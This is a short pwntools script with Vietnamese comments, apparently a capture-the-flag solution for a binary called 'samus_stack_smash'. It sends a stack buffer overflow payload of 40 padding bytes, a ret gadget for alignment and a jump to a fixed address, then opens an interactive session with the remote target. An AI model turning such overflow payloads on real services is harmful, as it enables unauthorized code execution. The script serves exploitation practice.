from pwn import *

# Chạy file trên local
# p = process('./ten_file')
# Kết nối tới server
p = remote('host', port)
rop = ROP('./samus_stack_smash')
ret_gadget = rop.ret.address
# Dựng payload có chèn ret gadget để căn chỉnh stack (chống crash)
payload = b'A' * 40
payload += p64(ret_gadget)
payload += p64(0x401216)
p.sendlineafter(b'> ', payload)
p.interactive()
